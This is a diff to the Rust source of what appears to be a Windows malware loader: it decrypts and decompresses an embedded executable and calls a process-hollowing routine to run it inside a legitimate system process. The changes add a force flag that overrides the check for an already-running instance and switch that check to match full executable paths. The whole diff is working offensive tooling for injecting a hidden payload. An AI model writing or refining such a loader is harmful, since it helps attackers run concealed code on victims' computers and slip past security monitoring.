@@ -2,6 +2,7 @@ mod hollow;
 use hollow::*;
 use std::fs::File;
 use std::io::{Read};
+use std::os::raw::c_void;
 use log::{debug, error, info, warn};
 use flate2::read::GzDecoder;
 use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
@@ -10,6 +11,11 @@ use windows_sys::Win32::System::Diagnostics::ToolHelp::{
     TH32CS_SNAPPROCESS, PROCESSENTRY32W
 };
 use windows_sys::Win32::Foundation::CloseHandle;
+use std::env;
+
+use winapi::um::winnt::{PROCESS_QUERY_LIMITED_INFORMATION, HANDLE};
+use winapi::um::processthreadsapi::{OpenProcess};
+use winapi::um::winbase::QueryFullProcessImageNameW; 
 
 #[cfg(debug_assertions)]
 fn init_logging() {
@@ -24,14 +30,23 @@ fn init_logging() {
 fn main() {
     init_logging();
 
+    // Parse command line arguments
+    let args: Vec<String> = env::args().collect();
+    let force_mode = args.contains(&"-f".to_string());
+
     // Check if target process is already running
-    let target_process = "systeminfo.exe";
+    let target_process = "C:\\Windows\\System32\\systeminfo.exe";
     info!("Checking if {} is already active...", target_process);
     if is_target_running(target_process) {
-        warn!("Detected an active instance of {}. Exiting.", target_process);
-        std::process::exit(0);
-    }
-    info!("System clear. Proceeding with process hollowing...");
+            if force_mode {
+                warn!("Detected an active instance of {}, but -f (force) is enabled. Proceeding...", target_process);
+            } else {
+                warn!("Detected an active instance of {}. Exiting. Use -f to override.", target_process);
+                std::process::exit(0);
+            }
+        } else {
+            info!("System clear. Proceeding with process hollowing...");
+        }
 
     info!("Start process hollowing");
     call_hollow_loader();
@@ -129,38 +144,40 @@ fn retrieve_embedded_pe() -> Vec<u8> {
     }
 }
 
-fn is_target_running(target_name: &str) -> bool {
+
+fn is_target_running(target_path: &str) -> bool {
     unsafe {
-        // Take a snapshot of all processes in the system
         let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if snapshot == std::ptr::null_mut() {
-            error!("Failed to create process snapshot.");
-            return false;
-        }
+        if snapshot == std::ptr::null_mut() { return false; }
 
         let mut entry: PROCESSENTRY32W = std::mem::zeroed();
         entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
 
-        // Start iterating through the processes
         if Process32FirstW(snapshot, &mut entry) != 0 {
             loop {
-                // Convert the UTF-16 EXE name to a Rust String
-                let exe_name = String::from_utf16_lossy(&entry.szExeFile)
-                    .trim_matches(char::from(0)) // Remove null terminators
-                    .to_lowercase();
+                // 1. Open the process to query its information
+                let h_process: HANDLE = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, entry.th32ProcessID);
                 
-                if exe_name == target_name.to_lowercase() {
-                    CloseHandle(snapshot);
-                    return true;
+                if !h_process.is_null() {
+                    let mut path_buffer: [u16; 260] = [0; 260];
+                    let mut size = path_buffer.len() as u32;
+
+                    // 2. Retrieve the full path of the executable
+                    if QueryFullProcessImageNameW(h_process, 0, path_buffer.as_mut_ptr(), &mut size) != 0 {
+                        let full_path = String::from_utf16_lossy(&path_buffer[..size as usize]).to_lowercase();
+                        
+                        if full_path == target_path.to_lowercase() {
+                            CloseHandle(h_process as *mut std::ffi::c_void);
+                            CloseHandle(snapshot);
+                            return true;
+                        }
+                    }
+                    CloseHandle(h_process as *mut std::ffi::c_void);
                 }
 
-                // Move to the next process in the snapshot
-                if Process32NextW(snapshot, &mut entry) == 0 {
-                    break;
-                }
+                if Process32NextW(snapshot, &mut entry) == 0 { break; }
             }
         }
-
         CloseHandle(snapshot);
     }
     false
